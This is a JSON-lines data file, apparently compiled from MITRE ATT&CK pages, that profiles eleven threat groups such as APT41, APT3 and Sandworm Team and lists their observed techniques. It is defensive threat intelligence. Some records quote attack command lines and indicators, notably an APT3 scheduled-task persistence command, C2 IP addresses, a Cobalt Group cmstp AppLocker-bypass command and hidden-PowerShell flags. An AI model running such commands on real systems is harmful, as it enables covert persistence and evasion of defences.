{"text": " [BlackTech](https://attack.mitre.org/groups/G0098) is a cyber espionage group operating against targets in East Asia, particularly Taiwan, and occasionally, Japan and Hong Kong.(Citation: TrendMicro BlackTech June 2017)", "idx": "https://attack.mitre.org/groups/G0098", "title": "BlackTech", "entity": "BlackTech", "entity_type": "groups", "entity_context": ["BlackTech has used e-mails with malicious links to lure victims into installing malware.\t ", "BlackTech has used spearphishing e-mails with malicious documents to deliver malware.", "BlackTech has used DLL side loading by giving DLLs hardcoded names and placing them in searched directories. ", "BlackTech has exploited a buffer overflow vulnerability in Microsoft Internet Information Services (IIS) 6.0, CVE-2017-7269, in order to establish a new HTTP or command and control (C2) server.", "BlackTech has used right-to-left-override to obfuscate the filenames of malicious e-mail attachments.", "BlackTech has used spearphishing e-mails with links to cloud services to deliver malware.", "BlackTech has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities CVE-2012-0158, CVE-2014-6352, CVE-2017-0199, and Adobe Flash CVE-2015-5119.", "BlackTech has used e-mails with malicious documents to lure victims into installing malware.\t "], "is_subtechnique": false}
{"text": " [APT41](https://attack.mitre.org/groups/G0096) is a threat group that researchers have assessed as Chinese state-sponsored espionage group that also conducts financially-motivated operations. Active since at least 2012, [APT41](https://attack.mitre.org/groups/G0096) has been observed targeting healthcare, telecom, technology, and video game industries in 14 countries. [APT41](https://attack.mitre.org/groups/G0096) overlaps at least partially with public reporting on groups including BARIUM and [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021)", "idx": "https://attack.mitre.org/groups/G0096", "title": "APT41", "entity": "APT41", "entity_type": "groups", "entity_context": ["APT41 deleted files from the system. ", "APT41 used the WMIEXEC utility to execute <code>whoami</code> commands on remote machines.", "APT41 executed <code>file /bin/pwd</code> in activity exploiting CVE-2019-19781 against Citrix devices.", "APT41 used DNS for C2 communications. ", " APT41 used the <code>net share</code> command as part of network reconnaissance.", "APT41 sent spearphishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims.", "APT41 leveraged PowerShell to deploy malware families in victims’ environments.", "APT41 used exploit payloads that initiate download via FTP.", "APT41 leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations.", "APT41 used a keylogger called GEARSHIFT on a target system.", "APT41 collected MAC addresses from victim machines. ", "APT41 leveraged sticky keys to establish persistence. ", "APT41 has used rundll32.exe to execute a loader.", "APT41 used compiled HTML (.chm) files for targeting. ", "APT41 has enumerated IP addresses of network resources and used the <code>netstat</code> command as part of network reconnaissance. The group has also used a malware variant, HIGHNOON, to enumerate active RDP sessions.", "APT41 has configured payloads to load via LD_PRELOAD.\t", "APT41 has transferred implant files using Windows Admin Shares.", "APT41 has created services to appear as benign system tools.", "APT41 deployed a Monero cryptocurrency mining tool in a victim’s environment.", "APT41 has used search order hijacking to execute malicious payloads, such as Winnti RAT.", "APT41 used  svchost.exe and Net to execute a system service installed to launch a Cobalt Strike BEACON loader.", "APT41 used VMProtected binaries in multiple intrusions.", "APT41 used a compromised account to create a scheduled task on a system.", "APT41 attempted to remove evidence of some of its activity by deleting Bash histories.", "APT41 used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits. ", "APT41 used legitimate websites for C2 through dead drop resolvers (DDR), including GitHub, Pastebin, and Microsoft TechNet.", "APT41 leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396. ", "APT41 malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process.", "APT41 has used DGAs to change their C2 servers monthly.", "APT41 has encrypted payloads using the Data Protection API (DPAPI), which relies on keys tied to specific user accounts on specific machines. APT41 has also environmentally keyed second stage malware with an RC5 key derived in part from the infected system's volume serial number.", "APT41 exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices.", "APT41 deployed Master Boot Record bootkits on Windows systems to hide their malware and maintain persistence on victim systems.", "APT41 has uploaded files and data from a compromised host.", "APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor.", "APT41 deployed rootkits on Linux systems.", "APT41 has used hashdump, Mimikatz, and the Windows Credential Editor to dump password hashes from memory and authenticate to other user accounts.", "APT41 used WMI in several ways, including for execution of commands via WMIEXEC as well as for persistence via PowerSploit.", "APT41 used <code>cmd.exe /c</code> to execute commands on remote machines.\nAPT41 used a batch file to install persistence for the Cobalt Strike BEACON loader.", "APT41 performed password brute-force attacks on the local admin account.", "APT41 has executed <code>file /bin/pwd</code> on exploited victims, perhaps to return architecture related information.", "APT41 used compromised credentials to log on to other systems.", "APT41 attempted to remove evidence of some of its activity by clearing Windows security and system events.", "APT41 created and modified startup files for persistence. APT41 added a registry key in <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost</code> to establish persistence for Cobalt Strike.", "APT41 modified legitimate Windows services to install malware backdoors. APT41 created the StorSyncSvc service to provide persistence for Cobalt Strike.", "APT41 has obtained and used tools such as Mimikatz, pwdump, PowerSploit, and Windows Credential Editor.", "APT41 created user accounts and adds them to the User and Admin groups. ", "APT41 used a tool called CLASSFON to covertly proxy network communications.", "APT41 used a malware variant called WIDETONE to conduct port scans on specified subnets.", "APT41 attempted to masquerade their files as popular anti-virus software.", "APT41 used BITSAdmin to download and install payloads.", "APT41 used a malware variant called GOODLUCK to modify the registry in order to steal credentials.", "APT41 gained access to production environments where they could inject malicious code into legitimate, signed files and widely distribute them to end users.", "APT41 used RDP for lateral movement.", "APT41 used legitimate executables to perform DLL side-loading of their malware. ", "APT41 used the Steam community page as a fallback mechanism for C2. ", "APT41 used certutil to download additional files.", "APT41 created a RAR archive of targeted files for exfiltration.", "APT41 compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service.\n", "APT41 used a ransomware called Encryptor RaaS to encrypt files on the targeted systems and provide a ransom note to the user."], "is_subtechnique": false}
{"text": " [APT3](https://attack.mitre.org/groups/G0022) is a China-based threat group that researchers have attributed to China's Ministry of State Security.(Citation: FireEye Clandestine Wolf)(Citation: Recorded Future APT3 May 2017) This group is responsible for the campaigns known as Operation Clandestine Fox, Operation Clandestine Wolf, and Operation Double Tap.(Citation: FireEye Clandestine Wolf)(Citation: FireEye Operation Double Tap) As of June 2015, the group appears to have shifted from targeting primarily US victims to primarily political organizations in Hong Kong.(Citation: Symantec Buckeye) In 2017, MITRE developed an APT3 Adversary Emulation Plan.(Citation: APT3 Adversary Emulation Plan)", "idx": "https://attack.mitre.org/groups/G0022", "title": "APT3", "entity": "APT3", "entity_type": "groups", "entity_context": ["APT3 has been known to pack their tools. ", "APT3 has been known to stage files for exfiltration in a single location.", "An APT3 downloader uses the Windows command <code>\"cmd.exe\" /C whoami</code>. The group also uses a tool to execute commands on remote computers.", "APT3 has been known to brute force password hashes to be able to leverage plain text credentials.", "APT3 will identify Microsoft Office documents on the victim's computer.", "APT3 has a tool that can list out currently running processes.", "APT3 has been known to create or enable accounts, such as <code>support_388945a0</code>.", "APT3 has a tool that can obtain information about the local system.", "APT3 has a tool that can run DLLs.", "APT3 has been known to add created accounts to local admin groups to maintain elevated access.", "An APT3 downloader creates persistence by creating the following scheduled task: <code>schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru \"System\"</code>.", "APT3 has a tool that exfiltrates data over the C2 channel.", "APT3 has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument \"dig.\"", "APT3 has a tool that can delete files.", "APT3 has sent spearphishing emails containing malicious links.", "APT3 has a tool that looks for files and directories on the local file system.", "APT3 has exploited the Adobe Flash Player vulnerability CVE-2015-3113 and Internet Explorer vulnerability CVE-2014-1776.", "APT3 has a tool that can detect the existence of remote systems.", "APT3 has been known to remove indicators of compromise from tools.", "An APT3 downloader uses the Windows command <code>\"cmd.exe\" /C whoami</code> to verify that it is running with the elevated privileges of “System.”", "APT3 has used a tool that can obtain info about local and global group users, power users, and administrators.", "APT3 has a tool that can locate credentials in files on the file system such as those from Firefox or Chrome.", "APT3 has used tools to compress data before exfilling it.", "APT3 will copy files over to Windows Admin Shares (like ADMIN$) as part of lateral movement.", "APT3 places scripts in the startup folder for persistence.", "APT3 uses commonly used ports (like HTTPS/443) for command and control.", "APT3 has been known to side load DLLs with a valid version of Chrome with one of their tools.", "APT3 has a tool that can enumerate current network connections.", "APT3 has a tool that can copy files to remote machines.", "APT3 leverages valid accounts after gaining credentials for use within the victim domain.", "APT3 enables the Remote Desktop Protocol for persistence. APT3 has also interacted with compromised systems to browse and copy files through RDP sessions.", "APT3 has lured victims into clicking malicious links delivered through spearphishing.", "An APT3 downloader first establishes a SOCKS5 connection to 192.157.198.103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60.229 on TCP port 81.", "APT3 has a tool that creates a new service for persistence.", "APT3 has used a keylogging tool that records keystrokes in encrypted files.", "APT3 replaces the Sticky Keys binary <code>C:\\Windows\\System32\\sethc.exe</code> for persistence.", "APT3 has used PowerShell on victim systems to download and run payloads after exploitation.", "APT3 has used tools to dump passwords from browsers.", "APT3 has been known to use <code>-WindowStyle Hidden</code> to conceal PowerShell windows.", "APT3 has a tool that can enumerate the permissions associated with Windows groups.", "An APT3 downloader establishes SOCKS5 connections for its initial C2.", "A keylogging tool used by APT3 gathers network information from the victim, including the MAC address, IP address, WINS, DHCP server, and gateway.", "APT3 obfuscates files or information to help evade defensive measures."], "is_subtechnique": false}
{"text": " FIN4 is a financially-motivated threat group that has targeted confidential information related to the public financial market, particularly regarding healthcare and pharmaceutical companies, since at least 2013. FIN4 is unique in that they do not infect victims with typical persistent malware, but rather they focus on capturing credentials authorized to access email and other non-public correspondence.", "idx": "https://attack.mitre.org/groups/G0085", "title": "FIN4", "entity": "FIN4", "entity_type": "groups", "entity_context": ["FIN4 has created rules in victims' Microsoft Outlook accounts to automatically delete emails containing words such as “hacked,\" \"phish,\" and “malware\" in a likely attempt to prevent organizations from communicating about their activities.", "FIN4 has used Tor to log in to victims' email accounts.", "FIN4 has used legitimate credentials to hijack email communications.", "FIN4 has used spearphishing emails containing attachments (which are often stolen, legitimate documents sent from compromised accounts) with embedded malicious macros.", "FIN4 has presented victims with spoofed Windows Authentication prompts to collect their credentials.", "FIN4 has lured victims to launch malicious attachments delivered via spearphishing emails (often sent from compromised accounts).", "FIN4 has lured victims to click malicious links delivered via spearphishing emails (often sent from compromised accounts).", "FIN4 has used HTTP POST requests to transmit data.", "FIN4 has used spearphishing emails (often sent from compromised accounts) containing malicious links.", "FIN4 has used VBA macros to display a dialog box and collect victim credentials.", "FIN4 has accessed and hijacked online email communications using stolen credentials.", "FIN4 has captured credentials via fake Outlook Web App (OWA) login pages and has also used a .NET based keylogger."], "is_subtechnique": false}
{"text": " [Sidewinder](https://attack.mitre.org/groups/G0121) is a suspected Indian threat actor group that has been active since at least 2012. They have been observed targeting government, military, and business entities throughout Asia, primarily focusing on Pakistan, China, Nepal, and Afghanistan.(Citation: ATT Sidewinder January 2021)(Citation: Securelist APT Trends April 2018)(Citation: Cyble Sidewinder September 2020)", "idx": "https://attack.mitre.org/groups/G0121", "title": "Sidewinder", "entity": "Sidewinder", "entity_type": "groups", "entity_context": ["Sidewinder has used PowerShell to drop and execute malware loaders.", "Sidewinder has used base64 encoding and ECDH-P256 encryption for scripts and files.", "Sidewinder has used tools to collect the computer name, OS version, installed hotfixes, as well as information regarding the memory and processor on a compromised host.", "Sidewinder has used tools to identify the user of a compromised host.", "Sidewinder has lured targets to click on malicious files to gain execution in the target environment.", "Sidewinder has used tools to obtain the current system time.", "Sidewinder has used tools to identify running processes on the victim's machine.", "Sidewinder has sent e-mails with malicious attachments often crafted for specific targets.", "Sidewinder has used LNK files to download remote files to the victim's network.", "Sidewinder has named malicious files <code>rekeywiz.exe</code> to match the name of a legitimate Windows executable.", "Sidewinder has sent e-mails with malicious links often crafted for specific targets.", "Sidewinder has used DLL side-loading to drop and execute malicious payloads including the hijacking of the legitimate Windows application file rekeywiz.exe.", "Sidewinder has used malware to collect information on files and directories.", "Sidewinder has used tools to enumerate software installed on an infected host.", "Sidewinder has exploited vulnerabilities to gain execution including CVE-2017-11882 and CVE-2020-0674.", "Sidewinder has configured tools to automatically send collected files to attacker controlled servers.", "Sidewinder has used <code>mshta.exe</code> to execute malicious payloads.", "Sidewinder has added paths to executables in the Registry to establish persistence.", "Sidewinder has used HTTP in C2 communications.", "Sidewinder has used tools to automatically collect system and network configuration information.", "Sidewinder has used the ActiveXObject utility to create OLE objects to obtain execution through Internet Explorer.", "Sidewinder has used the Windows service <code>winmgmts:\\\\.\\root\\SecurityCenter2</code> to check installed antivirus products.", "Sidewinder has collected stolen files in a temporary folder in preparation for exfiltration.", "Sidewinder has used JavaScript to drop and execute malware loaders.", "Sidewinder has sent e-mails with malicious attachments that lead victims to credential harvesting websites.", "Sidewinder has sent e-mails with malicious links to credential harvesting websites.", "Sidewinder has used VBScript to drop and execute malware loaders.", "Sidewinder has lured targets to click on malicious links to gain execution in the target environment.", "Sidewinder has used malware to collect information on network interfaces, including the MAC address."], "is_subtechnique": false}
{"text": " [Dragonfly](https://attack.mitre.org/groups/G0035) is a cyber espionage group that has been active since at least 2011. They initially targeted defense and aviation companies but shifted to focus to include the energy sector in early 2013. They have also targeted companies related to industrial control systems. (Citation: Symantec Dragonfly)(Citation: Secureworks IRON LIBERTY July 2019) A similar group emerged in 2015 and was identified by Symantec as [Dragonfly 2.0](https://attack.mitre.org/groups/G0074). There is debate over the extent of the overlap between [Dragonfly](https://attack.mitre.org/groups/G0035) and [Dragonfly 2.0](https://attack.mitre.org/groups/G0074), but there is sufficient evidence to lead to these being tracked as two separate groups. (Citation: Symantec Dragonfly Sept 2017)(Citation: Fortune Dragonfly 2.0 Sept 2017)(Citation: Dragos DYMALLOY )", "idx": "https://attack.mitre.org/groups/G0035", "title": "Dragonfly", "entity": "Dragonfly", "entity_type": "groups", "entity_context": ["Dragonfly has obtained and used tools such as Mimikatz, CrackMapExec, and PsExec.", "Dragonfly has compromised targets via strategic web compromise (SWC) utilizing a custom exploit kit.", "Dragonfly has placed trojanized installers on legitimate vendor app stores.", "Dragonfly has used spearphising campaigns to gain access to victims."], "is_subtechnique": false}
{"text": " The POS cluster is the most prolific associated to the CARBON SPIDER actor and is also known as FIN7.", "idx": "https://attack.mitre.org/groups/G0008", "title": "Carbanak", "entity": "Carbanak", "entity_type": "groups", "entity_context": ["Carbanak may use netsh to add local firewall rule exceptions.", "Carbanak has copied legitimate service names to use for malicious services.", "Carbanak has obtained and used open-source tools such as PsExec and Mimikatz.", "Carbanak malware installs itself as a service to provide persistence and SYSTEM privileges.", "Carbanak used legitimate programs such as AmmyyAdmin and Team Viewer for remote interactive C2 to target systems.", "Carbanak has used a VBScript named \"ggldr\" that uses Google Apps Script, Sheets, and Forms services for C2.", "Carbanak actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.", "Carbanak installs VNC server software that executes through rundll32.", "Carbanak has named malware \"svchost.exe,\" which is the name of the Windows shared service host program."], "is_subtechnique": false}
{"text": " [Windshift](https://attack.mitre.org/groups/G0112) is a threat group that has been active since at least 2017, targeting specific individuals for surveillance in government departments and critical infrastructure across the Middle East.(Citation: SANS Windshift August 2018)(Citation: objective-see windtail1 dec 2018)(Citation: objective-see windtail2 jan 2019)", "idx": "https://attack.mitre.org/groups/G0112", "title": "Windshift", "entity": "Windshift", "entity_type": "groups", "entity_context": ["Windshift has used malware to identify installed software.", "Windshift has used malware to identify installed AV and commonly used forensic and malware analysis tools.", "Windshift has used links embedded in e-mails to lure victims into executing malicious code.", "Windshift has used e-mail attachments to lure victims into executing malicious code.", "Windshift has used fake personas on social media to engage and target victims.\t", "Windshift has used tools to deploy additional payloads to compromised hosts.", "Windshift has used compromised websites to register custom URL schemes on a remote system.", "Windshift has sent spearphishing emails with links to harvest credentials and deliver malware.", "Windshift has used malware to enumerate active processes.", "Windshift has used Visual Basic 6 (VB6) payloads.", "Windshift has used tools that communicate with C2 over HTTP.", "Windshift has used malware to identify the computer name of a compromised host.", "Windshift has used string encoding with floating point calculations.", "Windshift has used malware to identify the username on a compromised host.", "Windshift has sent spearphishing emails with attachment to harvest credentials and deliver malware.", "Windshift has used revoked certificates to sign malware.", "Windshift has used WMI to collect information about target machines.", "Windshift has created LNK files in the Startup folder to establish persistence.", "Windshift has used icons mimicking MS Office files to mask malicious executables. Windshift has also attempted to hide executables by changing the file extension to \".scr\" to mimic Windows screensavers."], "is_subtechnique": false}
{"text": " [Sandworm Team](https://attack.mitre.org/groups/G0034) is a destructive threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) Main Center for Special Technologies (GTsST) military unit 74455.(Citation: US District Court Indictment GRU Unit 74455 October 2020)(Citation: UK NCSC Olympic Attacks October 2020) This group has been active since at least 2009.(Citation: iSIGHT Sandworm 2014)(Citation: CrowdStrike VOODOO BEAR)(Citation: USDOJ Sandworm Feb 2020)(Citation: NCSC Sandworm Feb 2020) In October 2020, the US indicted six GRU Unit 74455 officers associated with [Sandworm Team](https://attack.mitre.org/groups/G0034) for the following cyber operations: the 2015 and 2016 attacks against Ukrainian electrical companies and government organizations, the 2017 worldwide [NotPetya](https://attack.mitre.org/software/S0368) attack, targeting of the 2017 French presidential campaign, the 2018 [Olympic Destroyer](https://attack.mitre.org/software/S0365) attack against the Winter Olympic Games, the 2018 operation against the Organisation for the Prohibition of Chemical Weapons, and attacks against the country of Georgia in 2018 and 2019.(Citation: US District Court Indictment GRU Unit 74455 October 2020)(Citation: UK NCSC Olympic Attacks October 2020) Some of these were conducted with the assistance of GRU Unit 26165, which is also referred to as [APT28](https://attack.mitre.org/groups/G0007).(Citation: US District Court Indictment GRU Oct 2018)", "idx": "https://attack.mitre.org/groups/G0034", "title": "Sandworm Team", "entity": "Sandworm Team", "entity_type": "groups", "entity_context": ["Sandworm Team have used previously acquired legitimate credentials prior to attacks.", "Sandworm Team has crafted spearphishing emails with hyperlinks designed to trick unwitting recipients into revealing their account credentials.", "Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe.\t", "Sandworm Team has leased servers from resellers instead of leasing infrastructure directly from hosting companies to enable its operations.", "Sandworm Team's BCS-server tool connects to the designated C2 server via HTTP.\t", "Sandworm Team has used <code>move</code> to transfer files to a network share. ", "Sandworm Team used the <code>sp_addlinkedsrvlogin</code> command in MS-SQL to create a link between a created account and other servers in the network.", "Sandworm Team has created VBScripts to run an SSH server. ", "Sandworm Team's VBS backdoor can decode Base64-encoded data and save it to the %TEMP% folder. The group also decrypted received information using the Triple DES algorithm and decompresses it using GZip.", "Sandworm Team has used a script to attempt RPC authentication against a number of hosts. ", "Sandworm Team has used the BlackEnergy KillDisk component to overwrite files on Windows-based Human-Machine Interfaces. ", "Sandworm Team has used a tool to query Active Directory using LDAP, discovering information about computers listed in AD. ", "Sandworm Team has used Base64 encoding within malware variants. Sandworm Team has also used ROT13 encoding, AES encryption and compression with the zlib library for their Python-based backdoor.", "Sandworm Team has distributed NotPetya by compromising the legitimate Ukrainian accounting software M.E.Doc and replacing a legitimate software update with a malicious one.", "In 2017, Sandworm Team conducted technical research related to vulnerabilities associated with websites used by the Korean Sport and Olympic Committee, a Korean power company, and a Korean airport.", "Sandworm Team conducted technical reconnaissance of the Parliament of Georgia's official internet domain prior to its 2019 attack.", "In preparation for its attack against the 2018 Winter Olympics, Sandworm Team conducted online research of partner organizations listed on an official PyeongChang Olympics partnership site.", "Sandworm Team has scanned network infrastructure for vulnerabilities as part of its operational planning.", "Sandworm Team had gathered user, IP address, and server data related to RDP sessions on a compromised host. It has also accessed network diagram files useful for understanding how a host's network was configured. ", "Sandworm Team added a login to a SQL Server with <code>sp_addlinkedsrvlogin</code>.", "Sandworm Team has run <code>net use</code> to connect to network shares. ", "Sandworm Team has exfiltrated internal documents, files, and other data from compromised hosts.", "Sandworm Team has avoided detection by naming a malicious binary explorer.exe.", "Sandworm Team used UPX to pack a copy of Mimikatz. ", "Sandworm Team has used PowerShell scripts to run a credential harvesting tool in memory to evade defenses. ", "Sandworm Team has used webshells including P.A.S. Webshell to maintain access to victim networks.", "Sandworm Team has used backdoors that can delete files used in an attack from an infected system.", "Sandworm Team has conducted research against potential victim websites as part of its operational planning.", "Sandworm Team has collected the username from a compromised host.", "Sandworm Team has enumerated files on a compromised host.", "Sandworm Team has sent system information to its C2 server using HTTP.\t", "Sandworm Team has used various MS-SQL stored procedures. \n", "Sandworm Team has created new domain accounts on an ICS access server.", "Sandworm Team has run the  <code>xp_cmdshell</code> command in MS-SQL. ", "Sandworm Team has established social media accounts to disseminate victim internal-only documents and other sensitive data.", "Sandworm Team has registered domain names and created URLs that are often designed to mimic or spoof legitimate websites, such as email login pages, online file sharing and storage websites, and password reset pages.", "Sandworm Team has disabled event logging on compromised systems.", "Sandworm Team has exploited vulnerabilities in Microsoft PowerPoint via OLE objects (CVE-2014-4114) and Microsoft Word via crafted TIFF images (CVE-2013-3906).", "Sandworm Team has crafted phishing emails containing malicious hyperlinks.", "Sandworm Team has used Dropbear SSH with a hardcoded backdoor password to maintain persistence within the target network. Sandworm Team has also used VPN tunnels established in legitimate software company infrastructure to gain access to internal networks of that software company's users.", "Sandworm Team's research of potential victim organizations included the identification and collection of employee information.", "Sandworm Team has acquired open-source tools for some of it's operations; for example it acquired Invoke-PSImage to establish an encrypted channel from a compromised host to Sandworm Team's C2 server as part of its preparation for the 2018 Winter Olympics attack.", "Sandworm Team's CredRaptor tool can collect saved passwords from various internet browsers.", "Sandworm Team's plainpwd tool is a modified version of Mimikatz and dumps Windows credentials from system memory.\t", "Sandworm Team has developed malware for its operations, including malicious mobile applications and destructive malware such as NotPetya and Olympic Destroyer.", "Sandworm Team has created email accounts that mimic legitimate organizations for its spearphishing operations.", "Sandworm Team temporarily disrupted service to Georgian government, non-government, and private sector websites after compromising a Georgian web hosting provider in 2019.", "Sandworm Team has used stolen credentials to access administrative accounts within the domain.", "Sandworm Team used malware to enumerate email settings, including usernames and passwords, from the M.E.Doc application.\t", "Sandworm Team used a backdoor to enumerate information about the infected system's operating system.\t", "Sandworm Team has tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files.", "Sandworm Team's BCS-server tool uses base64 encoding and HTML tags for the communication traffic between the C2 server.\t", "Sandworm Team has researched software code to enable supply-chain operations, most notably for the 2017 NotPetya attack. Sandworm Team also collected a list of computers using specific software as part of its targeting efforts.", "Sandworm Team has used VBScript to run WMI queries. ", "Sandworm Team's BCS-server tool can create an internal proxy server to redirect traffic from the adversary-controlled C2 to internal servers which may not be connected to the internet, but are interconnected locally.\t", "Sandworm Team has used intercepter-NG to sniff passwords in network traffic.\t", "Sandworm Team defaced approximately 15,000 websites belonging to Georgian government, non-government, and private sector organizations in 2019.", "Sandworm Team has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.", "Sandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function.\t", "Sandworm Team has used a tool to query Active Directory using LDAP, discovering information about usernames listed in AD.\t", "Sandworm Team has used port 6789 to accept connections on the group's SSH server.", "Sandworm Team has obtained valid emails addresses while conducting research against target organizations that were subsequently used in spearphishing campaigns.", "Sandworm Team has used remote administration tools or remote industrial control system client software to maliciously release electricity breakers.", "Sandworm Team has used the Telegram Bot API from Telegram Messenger to send and receive commands to its Python backdoor. Sandworm Team also used legitimate M.E.Doc software update check requests for sending and receiving commands and hosted malicious payloads on putdrive.com.", "Sandworm Team has used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.", "Sandworm Team has delivered malicious Microsoft Office attachments via spearphishing emails.", "Sandworm Team checks for connectivity to other resources in the network. ", "Sandworm Team has pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.", "Sandworm Team has used the BlackEnergy KillDisk component to corrupt the infected system's master boot record.", "Sandworm Team researched Ukraine's unique legal entity identifier (called an \"EDRPOU\" number), including running queries on the EDRPOU website, in preparation for the NotPetya attack. Sandworm Team has also researched third-party websites to help it craft credible spearphishing emails."], "is_subtechnique": false}
{"text": " [Cobalt Group](https://attack.mitre.org/groups/G0080) is a financially motivated threat group that has primarily targeted financial institutions since at least 2016. The group has conducted intrusions to steal money via targeting ATM systems, card processing, payment systems and SWIFT systems. [Cobalt Group](https://attack.mitre.org/groups/G0080) has mainly targeted banks in Eastern Europe, Central Asia, and Southeast Asia. One of the alleged leaders was arrested in Spain in early 2018, but the group still appears to be active. The group has been known to target organizations in order to use their access to then compromise additional victims.(Citation: Talos Cobalt Group July 2018)(Citation: PTSecurity Cobalt Group Aug 2017)(Citation: PTSecurity Cobalt Dec 2016)(Citation: Group IB Cobalt Aug 2017)(Citation: Proofpoint Cobalt June 2017)(Citation: RiskIQ Cobalt Nov 2017)(Citation: RiskIQ Cobalt Jan 2018) Reporting indicates there may be links between [Cobalt Group](https://attack.mitre.org/groups/G0080) and both the malware [Carbanak](https://attack.mitre.org/software/S0030) and the group [Carbanak](https://attack.mitre.org/groups/G0008).(Citation: Europol Cobalt Mar 2018)", "idx": "https://attack.mitre.org/groups/G0080", "title": "Cobalt Group", "entity": "Cobalt Group", "entity_type": "groups", "entity_context": ["Cobalt Group has used the Plink utility to create SSH tunnels.", "Cobalt Group deleted the DLL dropper from the victim’s machine to cover their tracks.", "Cobalt Group has injected code into trusted processes.", "Cobalt Group has used public sites such as github.com and sendspace.com to upload files and then download them to victim computers. The group's JavaScript backdoor is also capable of downloading files.", "Cobalt Group has used DNS tunneling for C2.", "Cobalt Group has sent emails containing malicious attachments that require users to execute a file or macro to infect the victim machine.", "Cobalt Group has sent emails containing malicious links that require users to execute a file or macro to infect the victim machine.", "Cobalt Group has used Remote Desktop Protocol to conduct lateral movement.", "Cobalt Group has added persistence by registering the file name for the next stage malware under <code>HKCU\\Environment\\UserInitMprLogonScript</code>.", "Cobalt Group leveraged an open-source tool called SoftPerfect Network Scanner to perform network scanning.", "Cobalt Group has compromised legitimate web browser updates to deliver a backdoor. ", "Cobalt Group has used the command <code>cmstp.exe /s /ns C:\\Users\\ADMINI~W\\AppData\\Local\\Temp\\XKNqbpzl.txt</code> to bypass AppLocker and launch a malicious script.", "Cobalt Group has used powershell.exe to download and execute scripts.", "Cobalt Group has bypassed UAC.", "Cobalt Group has obtained and used a variety of tools including Mimikatz, PsExec, Cobalt Strike, and SDelete.", "Cobalt Group has used exploits to increase their levels of rights and privileges.", "Cobalt Group has sent emails with URLs pointing to malicious documents.", "Cobalt Group used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.", "Cobalt Group has created new services to establish persistence.", "Cobalt Group has executed JavaScript scriptlets on the victim's machine.", "Cobalt Group has sent malicious Word OLE compound documents to victims.", "Cobalt Group has used <code>odbcconf</code> to proxy the execution of malicious DLL files.", "Cobalt Group used a JavaScript backdoor that is capable of collecting a list of the security solutions installed on the victim's machine.", "Cobalt Group had exploited multiple vulnerabilities for execution, including Microsoft’s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.", "Cobalt Group has used regsvr32.exe to execute scripts.", "Cobalt Group has sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations. Attachment types have included .rtf, .doc, .xls, archives containing LNK files, and password protected archives containing .exe and .scr executables.", "Cobalt Group has used Registry Run keys for persistence. The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike.", "Cobalt Group has sent Word OLE compound documents with malicious obfuscated VBA macros that will run upon user execution.", "Cobalt Group has used a JavaScript backdoor that is capable of launching cmd.exe to execute shell commands. The group has used an exploit toolkit known as Threadkit that launches .bat files.", "Cobalt Group has used HTTPS for C2.", "Cobalt Group used the Ammyy Admin tool as well as TeamViewer for remote access, including to preserve remote access if a Cobalt Strike module was lost.", "Cobalt Group has created Windows tasks to establish persistence.", "Cobalt Group obfuscated several scriptlets and code used on the victim’s machine, including through use of XOR and RC4."], "is_subtechnique": false}
{"text": " [CopyKittens](https://attack.mitre.org/groups/G0052) is an Iranian cyber espionage group that has been operating since at least 2013. It has targeted countries including Israel, Saudi Arabia, Turkey, the U.S., Jordan, and Germany. The group is responsible for the campaign known as Operation Wilted Tulip. (Citation: ClearSky CopyKittens March 2017) (Citation: ClearSky Wilted Tulip July 2017) (Citation: CopyKittens Nov 2015)", "idx": "https://attack.mitre.org/groups/G0052", "title": "CopyKittens", "entity": "CopyKittens", "entity_type": "groups", "entity_context": ["CopyKittens uses ZPP, a .NET console program, to compress files with ZIP.", "CopyKittens uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.", "CopyKittens has used Metasploit and Empire for post-exploitation activities.", "CopyKittens digitally signed an executable with a stolen certificate from legitimate company AI Squared.", "CopyKittens has used PowerShell Empire.", "CopyKittens encrypts data with a substitute cipher prior to exfiltration.", "CopyKittens has used <code>-w hidden</code> and <code>-windowstyle hidden</code> to conceal PowerShell windows. "], "is_subtechnique": false}
